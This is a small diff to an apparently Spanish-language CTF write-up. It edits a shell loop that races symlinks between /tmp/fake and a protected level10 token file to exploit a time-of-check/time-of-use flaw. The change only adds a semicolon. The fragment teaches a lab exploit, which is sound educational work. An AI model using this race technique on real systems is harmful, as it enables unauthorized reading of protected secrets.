@@ -63,7 +63,7 @@ Creamos un archivo que sí podemos leer (`/tmp/fake`) y usamos un bucle para que
 touch /tmp/fake
 while true; do
     ln -sf /tmp/fake /tmp/exploit
-    ln -sf /home/user/level10/token /tmp/exploit
+    ln -sf /home/user/level10/token /tmp/exploit;
 done
 
 ```
